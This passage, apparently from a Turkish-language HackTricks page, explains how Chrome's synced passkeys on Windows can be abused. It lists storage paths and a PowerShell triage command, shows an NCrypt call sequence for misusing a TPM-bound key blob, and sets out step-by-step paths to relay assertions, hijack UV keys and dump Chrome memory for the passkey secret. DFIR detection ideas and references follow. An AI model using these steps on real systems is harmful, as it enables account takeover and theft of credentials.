%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`**, protobuf ile kodlanmış **`WebauthnCredentialSpecifics`** kayıtlarını depolar. Aynı kullanıcıya ait bir işlem, eşitlenen passkey’lerin **RP ID**’sini, **username**’ini, **credential ID**’sini ve şifrelenmiş private-key materyalini listeleyebilir.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**, **`wrapped_identity_private_key`** ve eşitlenen kimlik bilgilerini kurtarmak için kullanılan sarılmış sır gibi yerel cihaz kaydı durumunu depolar.<sup>[[4]](#references)</sup>

Hızlı triyaj:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM'e bağlı anahtar blob'ları yerel imzalama oracle'ı olarak kötüye kullanılabilir

Tarayıcı, TPM destekli bir kimlik anahtarını **`NCRYPT_OPAQUE_KEY_BLOB`** olarak dışa aktarır ve bu blob'u kullanıcının erişebildiği bir durumda saklarsa, malware'in ham özel anahtarı çıkarması **gerekmez**. Blob'u yalnızca **aynı makinede** yeniden içe aktarabilir ve yerel TPM'den saldırganın kontrolündeki verileri imzalamasını isteyebilir:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Bu, **hardware binding'in cihaz dışına aktarımı önlediği ancak ele geçirilmiş uç noktada aynı kullanıcı tarafından kullanımı engellemediği** anlamına gelir.

### Pratik kötüye kullanım yolları

1. **Pass-ta-key / cihaz kimliği aktarımı**<sup>[[4]](#references)</sup>
   - Chrome'un LevelDB veritabanından `WebauthnCredentialSpecifics` kayıtlarını listeleyin.
   - Bir passkey oturumu başlatın ve yeni bir WebAuthn challenge alın.
   - Bulut kimlik doğrulayıcı isteği bağlamasını imzalamak için çalınan `wrapped_identity_private_key` blob'unu kurbanın TPM'sinde kullanın.
   - Döndürülen assertion'ı relying party'ye aktarın.
   - RP'nin `userVerification=preferred` değerini kabul ettiği veya **`UV=0`** olan assertion'ları reddetmediği durumlarda bu yöntem özellikle değerlidir.
2. **Bekleyen UV key'in ele geçirilmesi**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state` öğesini silerek veya geçerli, imzalı bir `device/forget` işlemi göndererek yeniden onboarding yapılmasını zorlayın.
   - Onboarding sonrasında cihaz **`uv_key_pending`** durumunda kalırsa, saldırganın kontrolündeki bir UV public key kaydedin.
   - Sağlayıcı yeni UV key'in attestation / secure-hardware kaynağını doğrulamazsa, saldırganın key'iyle yapılan sonraki imzalar **`UV=1`** olarak değerlendirilir.
3. **Master secret / SDS kurtarma hırsızlığı**<sup>[[4]](#references)</sup>
   - Chrome'un senkronize passkey master secret'ını alması için kurtarma veya yeniden katılma işlemini zorlayın.
   - `passkey_enclave_state` öğesinin yeniden oluşturulmasını/değiştirilmesini izleyin, ardından düz metin **security domain secret (SDS)** bellekte bulunduğu sırada Chrome belleğini dökümleyin.
   - Kurtarılan SDS'yi kullanarak her `WebauthnCredentialSpecifics` kaydındaki şifrelenmiş alanların şifresini çözün ve taşınabilir WebAuthn private key'leri kurtarın.

### DFIR / tespit fikirleri

- `passkey_enclave_state` öğesinin **silinmesini/yeniden oluşturulmasını** izleyin.<sup>[[4]](#references)</sup>
- Tarayıcı dışı işlemlerin Chrome **`Sync Data\LevelDB`** öğesine anormal erişimi için uyarı oluşturun.
- **Chrome bellek dökümleri** veya şüpheli süreçler arası bellek erişimi için uyarı oluşturun.
- Tekrarlanan **Google Password Manager kurtarma PIN'i** istemlerini veya beklenmeyen yeniden onboarding işlemlerini araştırın.
- WebAuthn **`signCount`** değerinin senkronize passkey'lerde çoğu zaman kullanışlı olmadığını, sabit kalabileceğini unutmayın; bu nedenle klasik klon tespiti zayıftır.

## References

- [1] [Unit 42 – Yüksek Değerli Sektörleri Hedef Alan, Yıllarca Tespit Edilmeden Sürdürülen Operasyonların İncelenmesi](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgisi şifresinin çözülmesi → SYSTEM yetkisi için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon'ın İç Yüzü: Gizli Saldırı Operasyonunun Aktarım Ağı ve İşleyişinin Ortaya Çıkarılması](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Şifresiz Kimlik Doğrulamada Yeni Bir Saldırı Yüzeyi](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key depolama](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Veri Deposu Gerçekte Nasıl Çalışır: NTDS.dit'in İç Yüzü (1. Bölüm)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Uzak Lsass Bellek Dökümünden Parolaları Alma](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho, Still Toolkit ile Siber Casusluk Cephaneliğini Genişletiyor](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW işlevi ve `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` yedekleme modu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram SSS – etkin oturumları sonlandırma](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard ve Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Kimlik Bilgilerinin Korunması ve Yönetimi](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
{{#include ../../banners/hacktricks-training.md}}
